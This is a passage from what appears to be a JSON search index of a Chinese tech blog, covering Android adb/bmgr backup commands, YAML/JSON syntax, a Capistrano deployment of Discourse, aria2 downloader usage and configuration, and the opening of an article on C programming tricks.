run\r\n\r\n这个命令会导致所有调用备份代理的应用程序的都备份。\r\n\r\n使用恢复操作\r\n恢复操作不像备份操作，这是成批的在一起运行在一个偶然的基础上，立即执行恢复操作。备份管理器目前提供了两种类型的恢复操作。\r\n第一种恢复整个装置的数据备份。典型的表现只有当一个设备是第一个提供(复制设置和其他保存的状态从用户之前的设备)，是一个操作，只有系统可以执行。\r\n第二种恢复操作单个应用程序恢复到它的“活跃的”数据集；也就是说，应用程序将放弃其当前数据和恢复到最后一次正确数据，保存在当前的备份映像。\r\n您可以调用第二个恢复操作与requestRestore()方法。备份管理器将调用您的备份代理的onRestore()实现。\r\n\r\n当测试您的应用程序，你可以立即调用恢复操作，绕过requestRestore（）方法。使用bmgr恢复命令：\r\nadb shell bmgr restore package\r\n备份管理器将立即实例化应用程序的备份代理和调用它来恢复。这将发生，即使应用程序是当前没有运行。\r\n\r\n其他命令：\r\nWiping data（擦拭数据）\r\n\r\n一个应用程序的数据可以被清除从Activity数据集合中。这个操作非常有用，当你在开发一个备份代理。以防错误引导你写错误的数据或保存的状态信息。你可以擦拭一个应用程序的数据与bmgr擦拭命令：\r\nadb  shell  bmgr  wipe package\r\n\r\n接下来的备份操作应用程序的代理进程将看起来好像应用程序从未支持任何东西之前。\r\n\r\n查看backup（备份）是否可用\r\nadb shell bmgr enabled\r\n\r\n如果备份操作可用的，如果您的应用程序的备份代理是从未被调用备份，以验证操作系统是否认为它应该执行这些操作。\r\n\r\n你也可以直接禁用或启用备份管理器：\r\nadb shell bmgr enable boolean\r\n\r\n警告!\r\n当备份是禁用的，当前的备份运输将明确地擦拭Activity中的数据。如果当一个用户说他们不希望他们的数据备份，备份管理器方面希望。则没有新的数据将被保存从设备，没有恢复操作将成为完成恢复操作。除非备份管理器是重新启用(通过设置或通过以上bmgr命令)。\r\n\r\n\r\n\r\nadb\r\n启动adb服务,如果它没启动的话\r\n  adb start-server\r\n关闭服务\r\n  adb kill-server\r\n查看所连接的设备以及设备所对应的序列号\r\n  adb devices\r\n安装app,需要注意的是如果连接了两台设备,则会报错,此时可以添加-s serialNumber来处理\r\n  adb install -r xxxx.apk\r\n卸载app\r\n  adb uninstall packagename\r\n\r\n连接到指定的ip,这个通常配合wifidebug\r\n  adb connect device-ip-address\r\n从手 机复制文件出来\r\n  adb pull remote local\r\n向手机发送文件\r\n  adb push local remote\r\n  adb push foo.txt /sdcard/foo.txt\r\n查看bug报告\r\n  adb bugreport\r\n获取设备的ID和序列号\r\n  adb get-product\r\n  adb get-serialno\r\n\r\n进入shell环境\r\n  adb shell\r\n打印出内核的调试信息\r\n  adb shell dmesg\r\n清除应用的数据,很常用吧?\r\n  adb shell pm clear packagename\r\n查看栈顶Activity,可以用来获取包名\r\n  adb shell dumpsys activity top\r\n查看所有已安装的应用的包名\r\n  adb shell pm list packages -f\r\nam的状态 Activity Manager State\r\n  adb shell dumpsys activity\r\n包信息 Package Information\r\n  adb shell dumpsys package\r\n内存使用情况Memory Usage\r\n  adb shell dumpsys meminfo\r\nMemory Use Over Time\r\n  adb shell dumpsys procstats\r\nGraphics State\r\n  adb shell dumpsys gfxinfo\r\n\r\n  adb shell cat /proc/cpuinfo\r\n\r\n  6、删除Android系统Rom自带的软件\r\n\r\n    a.确定手机root了,取得了root权限才能删除系统文件呀.\r\n    b.下载Android_db.rar,解压到%windir/%System32下.\r\n    c.手机连接数据线,在电脑上打开cmd,然后输入命令\r\n            adb remount\r\n            adb shell\r\n            su\r\n            执行完成之后,你会看到:\r\n            daemon not running. starting it now \r\n            daemon started successfully \r\n    d.接着就是基础 命令行模式了,输入\r\n            cd system/app\r\n            你会发现没啥变化,然后输入ls回车.\r\n            这时候列表显示了system/app里面的所有文件,也就是Rom集成的一些软件了.\r\n    e.开始删除吧！比如删除Youtube,他的文件名是Youtube.odex和Youtube.apk\r\n            我们要删除这2个文件,敲入以下命令:\r\n            rm Youtube.*\r\n            重启,Youtube已经删除掉了,注意各位同学千万不要删除你不知道是啥的东西.","tags":null},{"location":"//blog.pytool.com/Post/基础/2017-04-18 yaml","title":"Swagger：Rest API的描述语言","text":"---\n\nJ\njinjia2语法\n  {%...%}  表达式\n  {{...}}  变量\n  {#...#}  注释\n\n[JSON语法]\n官网：http://www.json.org/\n说明： JSON语法是JavaScript对象表示法语法的子集\n\n语法规则\n  1 数据在名称/值对中\n  2 数据由逗号分隔\n  3 花括号保存对象\n  4 方括号保存数组\n  5 JSON值可以是：\n    数字（整数或浮点数）\n    字符串（在双引号中）\n    逻辑值（true 或 false）\n    数组（在方括号中）\n    对象（在花括号中）\n    null\n\nY\n[YAML语法]\n官网：http://www.yaml.org/\n说明：\n语法规则\n  1 大小写敏感\n  2 使用缩进表示层级关系（缩进时不允许Tab键，只允许使用空格；缩进空格数目不重要，只要相同层级的元素左侧对齐即可）\n  3 #表示注释，从#一直到行尾，都会被解析器忽略\n  4 支持的数据结构\n    对象（键值对的集合）\n    数组（一组按次序排列的值）\n    纯量（单个、不可再分的值）\n  5 数组用一个破折号加空格（\"- \"）表示\n  6 对象用一个冒号加空格（\": \"）表示\n  7 重复的节点（对象）首先由锚（用\u0026符号“\u0026”标记）标识，然后再用别名（以星号“*”引用）标识\n  8 常用符号","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 apt","title":"Linux命令 apt","text":"","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-29 用Capistrano部署Discourse","title":"用Capistrano部署Discourse","text":"Discourse是什么\n\nDiscourse6是最新最潮最酷的开源论坛软件（本站就是它的一个实例），由Stack Overflow的联合创始人Jeff Atwood创建。Jeff无法忍受现有的论坛软件——他想要一个更加社会化（civilized）、面向移动终端（mobile），并且使用起来更方便、简洁的论坛，于是就创造了Discourse。关于它的更多介绍，请参考Discourse官网3。\n为什么要用Capistrano部署\n\nDiscourse的官方推荐\u0026支持的部署方式是使用Docker的。其目在于简化、傻瓜化部署——用户根本不必了解Ruby、Ruby on Rails（没错Discourse是一个RoR程序）以及PostgreSQL、Redis、Sidekiq这一些列名词的意义及其背后需要安装、配置的软件，只要几个简单的命令，就能用Docker部署一个配置好的image！\n\n听上去不错，不过由于 墙 的存在，Ruby Gems（Ruby的packages）是没法正常下载安装的——虽然你可以使用Gems镜像，但那意味着你需要手工修改Docker image的配置或者模版等等；另一方面，官方的Docker image把数据库、缓存服务器、Web服务器等等全部集成在一个image内，这可能不够scalable——你可能想要在一群服务器上部署一个具有负载均衡（LB）和高可用性（HA）的Discourse，或者是使用外部的数据库／缓存服务而不是自己搭建。如果是这样，Capistrano可以帮上忙。\n\nCapistrano1是Ruby Web程序的流行的部署工具，它强大、灵活——既可以用来部署具有高可用性（HA）和负载均衡（LB）的服务器集群，也可以把数据库、缓存、Web和App服务等等全部部署在一台主机上；另外，它与Bundler（A Ruby package manager \u0026 installer）配合使用可以在 部署时 轻松解决Ruby Gems的下载问题。\n开始之前\n\n在开始之前，我必须要说明：相对于Docker方式，使用Capistrano对于用户有较高的要求——你必须对Ruby、RVM（本文假定Ruby都是通过RVM安装的）和Ruby on Rails有一些经验，知道如何安装Ruby Gems以及Bundler如何根据Gemfile管理Gems，你还要能够比较熟练地使用Google搜索解决一些诸如“如何运行这个Linux命令”之类的问题，当然Git也是必须的。如果你根本没有接触过Ruby或者Rails，我建议你先对照着Rails Guide练一遍，然后再回来。\n干货\n\nCapistrano的部署文件都在这里\nhttps://github.com/coin8086/discourse-capistrano6\n如果你是一个有经验的Rails开发者，我想你已经知道八成该怎么做了。简单地说，四步：\n\n    下载Discourse代码\n    加入Capistrano部署文件\n    初次部署之前的工作\n    部署\n\n下面对每一步做详细介绍。\n下载Discourse代码\n\n我们要从官方的Git repo clone代码到本地，做一些编辑，然后保存修改到自己的Git repo——这个repo必须是你要部署的主机可以访问的repo，所以一般来说它是一个remote repo——你可以利用GitHub，也可以在自己的某一台服务器上做一个私有的Git repo，这很简单。这样对本地代码而言我们就有了2个remote repo：将来我们升级Discourse时需要从官方repo fetch，然后打上我们将要做的patch，push到我们自己的remote repo，然后指示Capistrano从那里取得代码部署。\n\n从官方repo clone:\n\n    git clone git@github.com:discourse/discourse.git\n\n注意：\n\n    master是最新的开发分支，不是我们要部署的\n    可以部署的分支是：stable, beta和tests-passed，稳定性依次递减，但是代码更新依次递增。你可以选择任何一个分支，在这里我们选beta\n\n加入Capistrano部署文件\n\n需要的文件都在这：\nhttps://github.com/coin8086/discourse-capistrano6\n\n你要在本地新建一个Git分支（在stable, beta或者tests-passed的基础上），然后把上面的部署文件手工patch进去：\n\n    把discourse-capistrano的Gemfile内容添加到discourse的Gemfile里\n    把discourse-capistrano的Capfile文件添加到discourse根目录下\n    把discourse-capistrano的config目录的内容合并到discourse的config目录下\n\n然后你需要手工修改一下config/deploy.rb和config/deploy/production.rb，指定你的部署参数：\n\n    对于config/deploy.rb，你至少要指定“repourl”——就是上文提到的你存放修改过的Discourse的repo\n    对于config/deploy/production.rb，你至少要指定一个server\n\n以上文件中有充分的注释和示例，你只要修改必要的参数就好。\n\n然后安装Gems：\n\n    bundle install\n\n然后把所有Gems保存到vendor/cache目录下（此步骤可选）：\n\n    bundle package\n\n之所以这么做是因为我们想要在部署时从这个目录下安装所有的Gems，而不是从网上下载，因为 墙 会使所有的Gems安装失败——我们在本地开发时可以比较方便地通过VPN等工具下载好这些Gems，然后保存。注意：如果你选择这么做，你应该保证你的开发环境和部署环境一致——使用相同的OS以及Ruby版本。\n\n最后別忘了把所有的修改，连同vendor/cache下的Gems，一并保存到你的Git repo——就是上面的repourl所指定的那个。\n初次部署之前的工作\n\n好了，现在所有Capistrano部署脚本相关的工作已经完成了。但是我们还少一些东西，比如数据库，缓存服务等等。没有这些东西，部署的Discourse不会工作（如果没有数据库则部署不会成功）。在这里你可以选择自己搭建数据库，也可以利用一些现成的数据库服务（如阿里云数据库等等），缓存服务也是一样。下面的列表是你需要准备的东西：\n\n    Web/App服务器：Apache/Nginx ＋ Fusion Passenger /Unicorn /...任何支持Ruby Rack的服务器都可以\n    PostgreSQL数据库（参考PostgreSQL安装与管理速成指南）\n    Redis缓存服务（参考Redis缓存服务安装与管理速成指南）\n    Sidekiq后台处理服务\n    以及下面这些软件包：\n        ImageMagick\n        libxml2, libpq-dev, g++, gifsicle, libjpeg-progs, make\n\n除此以外，你还需要SMTP服务——Discourse有很多邮件通知，包括注册邮件。如果你没有SMTP，那么Discourse就难以工作。\n\n当你准备好了以上这些，你要告诉Discourse，通过config/discourse.conf。注意：你可以直接修改这个文件，然后保存到你的 私有 repo下；如果你使用 公开的 repo，比如GitHub，你应该把这个文件保存在其它地方，然后在部署时使用它——discourse-capistrano假定你把它保存在需要部署的主机的~/discourse.conf，脚本会在每次部署时把它链接到config/discourse.conf，如果这不是你想要的，注释掉相关的Capistrano代码（在config/deploy.rb中）。\n部署\n\n假设你的本地Git分支叫my-1.6.0-beta1——你已经加入了部署脚本并且把它push到了一个同名的remote repo下（就是你在repourl里指定的那个），你只需在本地执行：\n\n    bundle exec cap production deploy\n\n命令会提示你输入／确认要部署的remote分支名称，回车确认。\n\n注意：第一次部署会失败，因为数据库还没有初始化——discourse-capistrano的脚本缺省不会初始化数据库，否则以后每次升级数据库都会被重置。第一次失败以后，我们要登录待部署的主机，手工执行一下数据库初始化的工作——为什么不先执行一次初始化然后再部署？因为我们要让代码和Gems都更新完毕后才能利用Ruby脚本初始化，第一次部署虽然失败了，但是代码和Gems都已经安装完毕，如果失败不是因为其它原因的话。\n\n代码会部署在config/deploy.rb的deployto所指示的位置，登录部署主机进入这个目录，找到releases子目录，最新的代码就在其中（唯一的）的一个子目录里，进入这里。然后执行数据库初始化：\n\n    RAILSENV=production bundle exec rake db:create db:migrate\n\n之后在本地再重新执行一次部署命令，大功告成！\n部署之后的话\n\n    如果App服务器使用了Fusion Passenger，你需要阅读一下 https://github.com/SamSaffron/messagebus 的文档，设置passengerforcemaxconcurrentrequestsperprocess（Nginx）或者PassengerForceMaxConcurrentRequestsPerProcess（Apache）否则网站性能会随着访问人数的增加而显著下降\n    强烈推荐你使用CDN，这也是官方的建议\n\nDiscourse十分强大，也十分复杂——超过12万行Ruby代码以及15万行JavaScript，是我见过的最复杂的Rails程序——因此部署过程也相对复杂一些。所以官方推荐\u0026支持的方式是Docker——手工部署如Capistrano一般人确实hold不住（满满地自豪感:sunglasses::sweat_smile:）。但我之所以选择一条困难的路，其实首先是因为懒——我不了解Docker，也没有多少时间（其实是不想:joy:）去学习它；其次是因为我不想引入额外的复杂性——Discourse本身已经够复杂了，容器带来的额外的复杂性可能会对整个系统的稳定性产生影响，而一旦发生影响，问题的定位也会带着这一层额外的复杂性，这很麻烦——虽然这只是一种潜在的可能性，但IT界有句名言说“只要有可能就一定会发生”，我想想还是不要让它发生的好。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 aria2","title":"Linux命令 Aria2","text":"---\r\naria2/aria2: aria2 is a lightweight multi-protocol \u0026 multi-source, cross platform download utility operated in command-line. It supports HTTP/HTTPS, FTP, SFTP, BitTorrent and Metalink.\r\naria2配置示例 | Binuxの杂货铺\r\nAria2c 使用举例\r\n多线程下载axel\r\naxel -q -n 10 -o /tmp/ http://soft.vpser.net/lnmp/lnmp0.7-full.tar.gz\r\n\r\naria2c -c -x5 https://atlas.hashicorp.com/hashicorp/boxes/precise64/versions/1.1.0/providers/virtualbox.box\r\n -c  断点续传\r\n -x2 多线程 同一host建立多个连接\r\n -s2 大文件分段下载\r\n --max-upload-limit=100K 调节上传速度（Throttle upload speed）\r\n\r\nAria2 是一个轻量级多协议和多源 命令行 下载实用工具。它支持 HTTP / HTTPS, FTP, SFTP, bt 和 Metalink。通过内置 Aria2 可以操作 json - rpc 和 xml - rpc。对，Aria2 没有 GUI 图形界面，只有粗糙的命令行界面！但这也正是 Aria2 之轻快好省所在。\r\n\r\n命令行模式\r\n\r\n我们可以在命令行中非常简单地调用 aria2 进行多种协议的下载操作。例如：\r\n\r\n普通下载：\r\naria2c http://example.org/mylinux.iso\r\n\r\n多个源下载文件：同时使用两个连接\r\naria2c http://a/f.iso ftp://b/f.iso\r\n\r\n多线程下载\r\naria2c -x2 http://a/f.iso\r\n\r\n断点续传\r\naria2c -c http://host/partiallydownloadedfile.zip\r\n\r\n\r\n\r\n从 txt 文本文档中获取下载链接下载文件：\r\naria2c -i http://www.url.com/url.txt\r\n  -j5 用于指定同时下载的文件的数量\r\n\r\n写入到 /dev/null （Writing to /dev/null）\r\naria2c -d /dev -o null --allow-overwrite=true http://example.org/file\r\n\r\n为所有的连接设置代理服务器（Set proxy server to use all protocols(HTTP(S)/FTP)）\r\n\r\naria2c --all-proxy='http://proxy:8080' http://host/file\r\naria2c --http-proxy='http://proxy:8080' --http-proxy-user='username' --http-proxy-passwd='password' http://host/file\r\naria2c --http-proxy='http://username:password@proxy:8080' http://host/file\r\n\r\n\r\n使用 BitTorrent 协议下载：\r\n$ aria2c http://example.org/mylinux.torrent\r\n\r\n使用磁力链接（Magnet URI）进行下载：\r\n$ aria2c 'magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C'\r\n\r\nMetalink：\r\n$ aria2c http://example.org/mylinux.metalink\r\n\r\n下载 text 文本文件中的链接：\r\n$ aria2c -i uris.txt\r\n\r\n\r\n简易版的 Aria2 至此就部署完毕，你可以在 Web 控制前段方便地添加下载链接/bt种子了。如要想要进一步使用 Aria2，往下读吧。\r\n进阶 Aria2\r\n\r\n配置文件 aria2.conf 详解\r\n\r\n更多参数请参考官方说明文档： http://aria2.sourceforge.net/manual/en/html/aria2c.html  \r\n\r\n网友翻译的部分内容：   http://sydi.org/posts/linux/aria2c-usage-sample-cns.html#fn.1\r\n\r\n''开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##\r\n被注释的选项填写的是默认值, 建议在需要修改时再取消注释  \r\n\r\n基本选项 \r\n\r\n文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置\r\ndir=~/downloads\r\n 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M\r\ndisk-cache=32M\r\n文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc\r\n 预分配所需时间: none \u003c falloc ? trunc \u003c prealloc\r\nfalloc和trunc则需要文件系统和内核支持\r\n NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项\r\nfile-allocation=none\r\n断点续传，目前只支持 HTTP/HTTPS/FTP 协议\r\ncontinue=true\r\n检查文件完整性，默认：false\r\ncheck-intergrity=false\r\n帮助信息分类\r\n一个标签以#开头\r\n可用标签: basic, #advanced, #http, #https, #ftp, #metalink, #bittorrent, #cookie, #hook, #file, #rpc, #checksum, #experimental, #deprecated, #help, #all Default: #basic\r\n默认为basic\r\nhelp=#basic\r\n\r\n下载连接相关 \r\n\r\n最大同时下载任务数, 运行时可修改, 默认:5\r\nmax-concurrent-downloads=1\r\n 同一服务器连接数, 添加时可指定, 默认:1\r\nmax-connection-per-server=5\r\n最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M\r\n 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载\r\nmin-split-size=10M\r\n单个任务最大线程数, 添加时可指定, 默认:5\r\nsplit=5\r\n 整体下载速度限制, 运行时可修改, 默认:0\r\nmax-overall-download-limit=0\r\n 单个任务下载速度限制, 默认:0\r\nmax-download-limit=0\r\n 整体上传速度限制, 运行时可修改, 默认:0\r\nmax-overall-upload-limit=0\r\n 单个任务上传速度限制, 默认:0\r\nmax-upload-limit=0\r\n 禁用IPv6, 默认:false\r\ndisable-ipv6=true\r\n\r\n进度保存相关 \r\n\r\n从会话文件中读取下载任务\r\ninput-file=/etc/aria2/aria2.session\r\n 在Aria2退出时保存错误/未完成的下载任务到会话文件\r\nsave-session=/etc/aria2/aria2.session\r\n定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0\r\nsave-session-interval=60\r\n\r\nRPC相关设置 \r\n\r\n启用RPC, 默认:false\r\nenable-rpc=true\r\n 允许所有来源, 默认:false\r\nrpc-allow-origin-all=true\r\n允许非外部访问, 默认:false\r\nrpc-listen-all=true\r\n 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同\r\nevent-poll=select\r\n RPC监听端口, 端口被占用时可以修改, 默认:6800\r\nrpc-listen-port=6800\r\n 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项\r\nrpc-secret=TOKEN\r\n 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项\r\nrpc-user=USER\r\n 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项\r\nrpc-passwd=PASSWD\r\n\r\n BT/PT下载相关 ##\r\n\r\n当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true\r\nfollow-torrent=true\r\nBT监听端口, 当端口被屏蔽时使用, 默认:6881-6999\r\nlisten-port=51413\r\n 单个种子最大连接数, 默认:55\r\nbt-max-peers=55\r\n 打开DHT功能, PT需要禁用, 默认:true\r\nenable-dht=false\r\n打开IPv6 DHT功能, PT需要禁用\r\nenable-dht6=false\r\nDHT网络监听端口, 默认:6881-6999\r\ndht-listen-port=6881-6999\r\n本地节点查找, PT需要禁用, 默认:false\r\nbt-enable-lpd=false\r\n种子交换, PT需要禁用, 默认:true\r\nenable-peer-exchange=false\r\n 每个种子限速, 对少种的PT很有用, 默认:50K\r\nbt-request-peer-speed-limit=50K\r\n 客户端伪装, PT需要\r\npeer-id-prefix=-TR2770-\r\nuser-agent=Transmission/2.77\r\n当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0\r\nseed-ratio=0\r\n 强制保存会话, 话即使任务已经完成, 默认:false\r\n较新的版本开启后会在任务完成后依然保留.aria2文件\r\nforce-save=false\r\nBT校验相关, 默认:true\r\nbt-hash-check-seed=true\r\n继续之前的BT任务时, 无需再次校验, 默认:false\r\nbt-seed-unverified=true\r\n 保存磁力链接元数据为种子文件(.torrent文件), 默认:false\r\nbt-save-metadata=true\r\n\r\n新建链接任务进阶\r\n\r\n直接添加链接下载文件：\r\n\r\nhttp://www.url.com/file.zip\r\n\r\n从多个地址源下载同一个文件（用空格隔开）：\r\n\r\nhttp://www.url1.com/file.zip www.url2.com/file.zip\r\n\r\n使用 n 个线程下载文件（\"x2\" 就是 2 个线程）：\r\n\r\n-x2 http://www.url.com/file.zip\r\n\r\n\r\n基本使用\r\n下载一个文件（Download a file）：\r\n\r\naria2c http://host/image.iso\r\n\r\n说明：1.10.0以后的版本默认对每个 host 使用 1 个连接，你可以使用 –max-connection-per-server 或者 -x 选项进行改变。\r\n用每个 host 两个连接从一个 host 下载一个文件（To download a file using 2 connections from single host）：\r\n\r\naria2c -x2 http://host/image.iso\r\n\r\n说明：想要停止下载，可以按Ctrl-C。想要恢复下载，可以在同一个文件夹中执行相同的下载命令。只要URI指向同一个文件，URIs是可以被改变的。\r\n同时使用两个连接下载同一文件（Download a file using 2 connections）：\r\n\r\naria2c -s2 http://host/image.iso http://mirror1/image.iso http://mirror2/image.iso\r\n\r\n说明：你可以指定URIs的数量多余 -s 选项设定的数。在这个例子中，前两个URL会被用于下载，而第三个URL作为备用（如果前面两个有个挂了，第三个顶上）。\r\n同时从FTP和HTTP源下载一个文件（Download a file from HTTP and FTP servers）：\r\n\r\naria2c http://host1/file.zip ftp://host2/file.zip\r\n\r\n并行下载任意数目的URI, metalink, torrent（Parallel downloads of arbitrary number of URI, metalink, torrent）：\r\n\r\naria2c -Z http://host/file1 file2.torrent file3.metalink\r\n\r\n说明：如果你只是下载 torrent 和 metalink 的文件，那么选项 -Z 将不是必须的。所以你可以使用以下这个命令同时下载bt文件。\r\n\r\naria2c file1.torrent file2.torrent\r\n\r\n并发下载一个文件中的URI（Download files listed in a file concurrently）：\r\n\r\naria2c -ifiles.txt -j5\r\n\r\n说明：选项 -j 用于指定同时下载的文件的数量。你可以在文件中指定本地的 torrent 和 metalink 文件。\r\n\r\n说明：你可以指定一些 选项 在下载文件（input list file）中。\r\n在退出时保存错误/未完成的下载（Save error/unfinished downloads on exit）：\r\n\r\naria2c -ifiles.txt --save-session=out.txt\r\n\r\n当你按下Ctrl-C或者 aria2 退出时，所有的错误（error）/未完成（unfinished）下载将会保存到 out.txt 文件中。注意通过 XML-RPC 方式(aria2.addTorrent and aria2.addMetalink)添加的下载不会被保存！你可以使用这个文件作为一个输入文件列表（input file list）来重新开始下载。\r\n\r\naria2c -iout.txt\r\n\r\nMetalink Download（不翻译）\r\nBT下载（BitTorrent Download）\r\n通过网上的种子文件下载（Download files from remote BitTorrent file）\r\n\r\naria2c http://site/file.torrent\r\n\r\n通过网上的种子文件下载，种子保存在内存（Download files from remote BitTorrent file; torrent file itself is processed in memory）\r\n\r\naria2c --follow-torrent=mem http://site/file.torrent\r\n\r\n通过本地的种子文件下载（Download using a local torrent file）\r\n\r\naria2c -u40K /path/to/file.torrent\r\n\r\n说明： -u, –max-upload-limit 指定最大的上传速度\r\n\r\n说明：想要停止下载，可以按Ctrl-C。想要恢复下载，可以在同一个文件夹中执行相同的下载命令。只要URI指向同一个文件，URIs是可以被改变的。\r\n\r\n你可以同时进行多个 bt 的下载：\r\n\r\naria2c /path/to/file1.torrent /path/to/file2.torrent\r\n\r\n通过 bt magnet uri 下载（Download using BitTorrent Magnet URI）\r\n\r\naria2c \"magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C\u0026dn=aria2\"\r\n\r\n说明：在 bt magnet uri 包含\"\u0026\"的时候记住要加单引号或者双引号。强烈推荐打开 DHT 选项。 –enable-dht\r\n保存元数据到 .torrent 文件中（Save metadata as .torrent file）\r\n\r\naria2c --bt-save-metadata \"magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C\u0026dn=aria2\"\r\n\r\n上面那个命令会保存元数据到一个名为\"248d0a1cd08284299de78d5c1ed359bb46717d8c.torrent\"的种子文件。\r\n自动调节连接数（Adjust the number of peers adaptively）\r\n\r\n如果每个种子的下载速度都低于 200K 的话， aria2 会临时增加连接数来试着提高下载速度。\r\n\r\naria2c --bt-request-peer-speed-limit=200K file.torrent\r\n\r\n说明：配置 –bt-request-peer-speed-limit 选项为合适的值可以在某些情况下提高你的下载速度。\r\n打开 DHT （Enable DHT）\r\n\r\naria2c --enable-dht http://site/file.torrent\r\n\r\n说明：从 1.7.2 版本开始， DHT 默认是打开的。当通过 HTTP/FTP 下载的时候 DHT 不会启用。当首个种子下载开始， aria2 初始化 DHT 功能，之后， DHT 会一直运行知道 aria2 退出为止。\r\n打开 IPv6 的 DHT （Enable IPv6 DHT）\r\n\r\naria2c --enable-dht6 --dht-listen-port=6881 --dht-listen-addr6=YOURGLOBALUNICASTIPV6ADDR --enable-async-dns6\r\n\r\n说明：如果 aria2c 编译的时候没有加入 c-ares ， –enable-async-dns6 不是必须的。 aria2 会在 IPv4 和 IPv6 之间对 DHT 共享一些端口。\r\nAdd and remove tracker URI\r\n\r\n接下来的例子指示 aria2 移除 file.torrent 文件中所有的 tracker announce URIs ，并用\"http://tracker1/announce\" 和 \"http://tracker2/announce\" 代替。\r\n\r\naria2c --bt-exclude-tracker=\"*\" --bt-tracker=\"http://tracker1/announce,http://tracker2/announce\" file.torrent\r\n\r\n加密（Encryption）\r\n\r\n默认情况下， aria2 能够同时支持加密和非加密连接。它会先尝试使用加密连接，如果失败则尝试非加密连接。\r\n\r\n强制只使用加密连接：\r\n\r\naria2c --bt-require-crypto=true http://site/file.torrent\r\n\r\n一共有两种加密类型：只加密头或者全部加密。默认下，如果对方支持两种加密类型， aria2 会选择只加密头。如果想让 aria2 总是使用全加密连接：\r\n\r\naria2c --bt-min-crypto-level=arc4 http://site/file.torrent\r\n\r\n打印一个种子文件中的内容（Print the contents of the torrent file）\r\n\r\naria2c -S file.torrent\r\n\r\n选择性下载文件（Download only selected files using index (usually called \"selectable download\")）\r\n\r\naria2c --select-file=1-4,8 -Tfile.torrent\r\n\r\n说明：序号（index）可以通过 -S 选项输出\r\n改变监听端口（Change the listening port for incoming peer）\r\n\r\naria2c --listen-port=6881-6883 file.torrent\r\n\r\n说明：确认该 TCP 端口是可用的\r\n指定 BT 下载停止的条件（Specify the condition to stop program after torrent download finished）\r\n\r\naria2c --seed-time=120 --seed-ratio=1.0 file.torrent\r\n\r\n说明：在上面的这个例子中， 当做种 120分钟 或者种子率大于1以后， aria2 会退出。\r\n调节上传速度（Throttle upload speed）\r\n\r\naria2c --max-upload-limit=100K file.torrent\r\n\r\n为已经下载完成的文件做种（Seeding already downloaded file）\r\n\r\n你可以使用 -V 选项给已经下载好的文件做种。它会先校验文件的完整性。\r\n\r\naria2c -V -d/path/to/dir file.torrent\r\n\r\n如果你肯定文件是正确的，你可以使用 –bt-seed-unverified 选项跳过做种前的文件校验。\r\n\r\naria2c --bt-seed-unverified -d/path/to/dir file.torrent\r\n\r\n你可以给多个文件做种：\r\n\r\naria2c --bt-seed-unverified -d/path/to/dir file1.torrent file2.torrent\r\n\r\n用序号指定文件名（Specify file name with index）\r\n\r\n为 BitTorrent 下载下来的文件指定文件名，你首先需要通过 -S 选项知道该文件的序号。比如一个种子文件 -S 选项输出如下：\r\n\r\nidx|path/length\r\n+======================\r\n1|dist/base-2.6.18.iso\r\n|99.9MiB","tags":null},{"location":"//blog.pytool.com/Post/基础/2015-03-29 C语言的奇技淫巧","title":"C语言的奇技淫巧","text":"---\n\nC语言的奇技淫巧\n\nCategory: C语言, 编程语言 Tags: C语言, tricks, 技巧, 未定义行为 Leave a Comment\nC语言\n\n的tricks不多，但大多比较晦涩，就跟数学一样需要循序渐进的理解，同时也需要对编译器、C语言标准都有一定的理解。而C语言的雷区较多，也即有很多我们经常碰到的未定义行为(undefined behavior)。在看tricks前，我们先看个雷：\nC\n1\n\na = b + c;\n\n它看起来很简单，对吗？但如果b和c加起来大于了上限，如INTMAX，那编译器会做什么？事实上这里会得到一个负数。这是非常令人烦躁的未定义举动，尤其是你因为它而要debug的时候。当然，标准会告诉你每次都去检查它没有意义，我们要的只是一个高速语言。恩，读者要记住一件事，玩标准的人不写代码。而且，千万不要轻易的忽略它们，它们都有可能造成致命的问题。——所以说C语言是高手才能真正玩好的语言。如果没有对C语言较好的了解，不要轻易的使用各类tricks，说不定里面就埋了个debug不出来的雷。\n\n我们开始，先看个小技巧，舒缓一下心情：\n编译器判断优化\n\n1\n2\n\ndefine likely(x)       builtinexpect((x),1)\ndefine unlikely(x)     _builtinexpect((x),0)\n\n这个技巧就是在循环判断时去期望是或否。这涉及到了编译器优化，以及很经典的火车选路。在linux内核中十分常见。你可以给知道它的人加5分，懂一点内核挺好的。\n定长类型\n\n再来一个我们在强类型时不能忽略的：\nstdint.h\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\nifndef _int8tdefined\n define int8tdefined\ntypedef signed char\t\tint8t;\ntypedef short int\t\tint16t;\ntypedef int\t\t\tint32t;\nif _WORDSIZE == 64\ntypedef long int\t\tint64t;\n else\nextension\ntypedef long long int\t\tint64t;\nendif\nendif\n\n这些类型非常棒，比起char, short, int, long的意思清晰十倍，尤其在bitmap运算时，最好用这些强类型（记得在算bits时要用UINT）。\n\n但你可以看到项目组里往往用\n1\n2\n\ndefine INT16 short\ndefine INT32  long\n\n这样的代码来定义它们，实际上是错误的，乖乖的#include stdint.h为好。\n\n逗号运算符\n\n像这样用是可以的。注意逗号取最后一个值返回。\n1\n2\n3\n4\n\nfor (int i=0; i \u0026lt; 10; i++, doSomethingElse())\n{\n  / whatever 